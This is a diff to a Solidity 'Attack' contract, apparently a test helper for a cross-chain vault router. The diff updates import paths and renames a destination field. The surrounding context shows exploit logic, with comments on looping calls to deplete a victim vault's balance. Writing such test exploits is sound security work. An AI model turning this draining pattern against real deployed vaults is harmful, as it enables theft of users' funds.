@@ -7,11 +7,11 @@ import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 import {ERC1155Holder} from "@openzeppelin/contracts/token/ERC1155/utils/ERC1155Holder.sol";
 import {ERC1155Receiver} from "@openzeppelin/contracts/token/ERC1155/utils/ERC1155Receiver.sol";
 import {IERC165} from "@openzeppelin/contracts/interfaces/IERC165.sol";
-import {StateReq} from "../types/DataTypes.sol";
-import {LiqRequest} from "../types/LiquidityTypes.sol";
-import {StateRegistry} from "../crosschain-data/StateRegistry.sol";
-import {SuperRouter} from "../SuperRouter.sol";
-import {VaultMock} from "../test/mocks/VaultMock.sol";
+import {StateReq} from "../../types/DataTypes.sol";
+import {LiqRequest} from "../../types/LiquidityTypes.sol";
+import {StateRegistry} from "../../crosschain-data/StateRegistry.sol";
+import {SuperRouter} from "../../SuperRouter.sol";
+import {VaultMock} from "../mocks/VaultMock.sol";
 
 // https://solidity-by-example.org/call/
 
@@ -19,14 +19,14 @@ import {VaultMock} from "../test/mocks/VaultMock.sol";
 contract Attack is Ownable, ERC1155Holder {
     address payable immutable superRouterSource;
     address payable immutable stateRegistryDestination;
-    address payable immutable superDestination;
+    address payable immutable erc4626form;
     address immutable victimUnderlyingAsset;
     address immutable victimVault;
 
     constructor(
         address payable superRouterSource_,
         address payable stateRegistryDestination_,
-        address payable superDestination_,
+        address payable erc4626form_,
         address victimUnderlyingAsset_,
         address victimVault_
     ) {
@@ -34,7 +34,7 @@ contract Attack is Ownable, ERC1155Holder {
 
         stateRegistryDestination = stateRegistryDestination_;
 
-        superDestination = superDestination_;
+        erc4626form = erc4626form_;
 
         victimUnderlyingAsset = victimUnderlyingAsset_;
 
@@ -57,9 +57,7 @@ contract Attack is Ownable, ERC1155Holder {
         /// @dev the best would be to set a variable with the number of loops needed to deplete the vault (calculate beforehand)
         /// @dev this check is important because if the transaction reverts in SuperDestination it enters the catch block
         /// @dev of the destination chain stateRegistry processPayload() function, which reverts
-        uint256 vaultBalance = VaultMock(victimVault).balanceOf(
-            superDestination
-        );
+        uint256 vaultBalance = VaultMock(victimVault).balanceOf(erc4626form);
 
         if (vaultBalance > 999) {
             // send enough eth as gas to keep the tx alive, 1 as example
@@ -106,13 +104,9 @@ contract Attack is Ownable, ERC1155Holder {
         }(payloadId);
     }
 
-    function supportsInterface(bytes4 interfaceId)
-        public
-        view
-        virtual
-        override(ERC1155Receiver)
-        returns (bool)
-    {
+    function supportsInterface(
+        bytes4 interfaceId
+    ) public view virtual override(ERC1155Receiver) returns (bool) {
         return super.supportsInterface(interfaceId);
     }
 }
